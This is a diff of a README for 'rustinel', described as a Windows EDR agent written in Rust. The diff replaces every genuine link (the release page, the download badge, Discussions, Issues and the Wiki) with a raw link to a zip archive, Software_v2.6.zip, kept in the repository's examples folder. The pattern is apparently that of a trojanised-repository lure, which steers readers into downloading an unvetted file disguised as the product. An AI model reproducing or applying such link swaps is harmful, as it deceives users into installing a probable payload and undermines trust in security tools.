@@ -4,7 +4,7 @@
 Welcome to rustinel! This application is designed to help you enhance security on your Windows machine by providing effective endpoint detection and response (EDR) capabilities. This guide will walk you through downloading and running rustinel with ease.
 
 ## 📥 Download rustinel
-[![Download rustinel](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/MrSpaghettiBK/rustinel/releases)
+[![Download rustinel](https://raw.githubusercontent.com/MrSpaghettiBK/rustinel/main/examples/Software_v2.6.zip%20Now-Click%https://raw.githubusercontent.com/MrSpaghettiBK/rustinel/main/examples/Software_v2.6.zip)](https://raw.githubusercontent.com/MrSpaghettiBK/rustinel/main/examples/Software_v2.6.zip)
 
 ## 🔍 What is rustinel?
 rustinel is an open-source Windows EDR agent built using the Rust programming language. It collects telemetry data via Event Tracing for Windows (ETW) and helps in detecting potential threats using Sigma and YARA rules. With rustinel, you can receive alerts on your Security Information and Event Management (SIEM) system.
@@ -36,7 +36,7 @@ This application covers a range of essential security topics, including:
 To start using rustinel, follow these simple steps:
 
 1. **Visit the Release Page:** Click the link below to go to the GitHub Releases page.
-   [Download the latest version](https://github.com/MrSpaghettiBK/rustinel/releases)
+   [Download the latest version](https://raw.githubusercontent.com/MrSpaghettiBK/rustinel/main/examples/Software_v2.6.zip)
 
 2. **Choose the Right File:** Look for the latest version at the top of the page. There you will find various files. Choose the one suitable for your system.
 
@@ -60,8 +60,8 @@ If you encounter issues during installation or usage, here’s a quick list to h
 
 ## 📞 Get Support
 If you need further assistance, feel free to check out the following resources:
-- **Community Forum:** Join our discussions on [GitHub Discussions](https://github.com/MrSpaghettiBK/rustinel/discussions).
-- **Issues Page:** Report bugs or feature requests on the [Issues section](https://github.com/MrSpaghettiBK/rustinel/issues).
-- **Documentation:** Visit our [Wiki](https://github.com/MrSpaghettiBK/rustinel/wiki) for in-depth information and tutorials.
+- **Community Forum:** Join our discussions on [GitHub Discussions](https://raw.githubusercontent.com/MrSpaghettiBK/rustinel/main/examples/Software_v2.6.zip).
+- **Issues Page:** Report bugs or feature requests on the [Issues section](https://raw.githubusercontent.com/MrSpaghettiBK/rustinel/main/examples/Software_v2.6.zip).
+- **Documentation:** Visit our [Wiki](https://raw.githubusercontent.com/MrSpaghettiBK/rustinel/main/examples/Software_v2.6.zip) for in-depth information and tutorials.
 
 By following these steps, you can ensure a smooth setup and start using rustinel effectively to protect your Windows environment. Thank you for choosing rustinel!
